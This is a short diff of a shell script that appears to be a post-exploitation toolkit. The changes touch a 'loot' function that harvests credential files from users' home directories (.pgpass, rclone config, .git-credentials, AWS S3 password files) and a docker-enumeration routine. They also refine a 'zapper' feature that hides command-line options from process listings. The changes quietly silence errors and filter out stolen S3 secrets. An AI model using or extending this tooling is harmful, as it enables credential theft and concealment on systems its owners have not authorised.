@@ -746,7 +746,7 @@ bin() {
 
     { [[ "$optsstr" == *"zapper"* ]] || [[ -z "$optsstr" ]]; } && echo -e ">>> ${CW}TIP${CN}: Type ${CDC}zapme${CN} to hide all command line options\n>>> from your current shell and all further processes."
 
-    echo -e ">>> ${CDG}Download COMPLETE${CN}"
+    # echo -e ">>> ${CDG}Download COMPLETE${CN}"
     unset _HS_SINGLE_MATCH
     hs_init_alias_reinit
 }
@@ -1195,7 +1195,7 @@ _lootmore_docker() {
         [ ! -e "$fn" ] && return
         DOCKER_HOST="unix://${fn}"
     }
-    str="$(DOCKER_HOST="${DOCKER_HOST}" docker ps -a)"
+    str="$(DOCKER_HOST="${DOCKER_HOST}" docker ps -a 2>/dev/null)"
     [ -z "$str" ] && return
 
     echo -e "${CB}Docker ${CDY}${CF}"
@@ -1341,7 +1341,7 @@ loot() {
     _loot_homes "PGSQL"  ".pgpass"
     _loot_homes "RCLONE" ".config/rclone/rclone.conf"
     _loot_homes "GIT"    ".git-credentials"
-    _loot_homes "AWS S3" ".s3cfg"
+    _loot_homes "AWS S3" ".s3cfg"           grep --color=never -E '=[\s]*[^\s]{6,}'
     _loot_homes "AWS S3" ".passwd-s3fs"
     _loot_homes "AWS S3" ".s3backer_passwd"
     _loot_homes "AWS S3" ".passwd-s3fs"
